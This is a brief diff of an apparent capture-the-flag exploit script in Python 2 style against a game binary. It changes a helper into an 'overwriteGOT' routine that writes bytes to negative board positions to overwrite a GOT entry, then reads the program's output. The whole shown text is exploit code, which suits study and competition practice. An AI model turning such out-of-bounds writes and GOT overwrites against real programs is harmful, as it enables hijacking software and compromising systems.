@@ -30,7 +30,7 @@ def changeFlavor(content):
 def playerMove(pos):
     io.sendlineafter("(9 to change flavor): ", str(pos))
 
-def createLoop():
+def overwriteGOT():
     changeFlavor("\x46")
     playerMove(-34)
     changeFlavor("\x8C")
@@ -39,7 +39,7 @@ def createLoop():
     
 if __name__ == "__main__":
     io.sendlineafter("(1)st or (2)nd? ", "1")
-    patchCycle()
-
-    
-    io.interactive()
+    overwriteGOT()
+    io.sendline("8")
+    print io.recvall()
+    io.close()
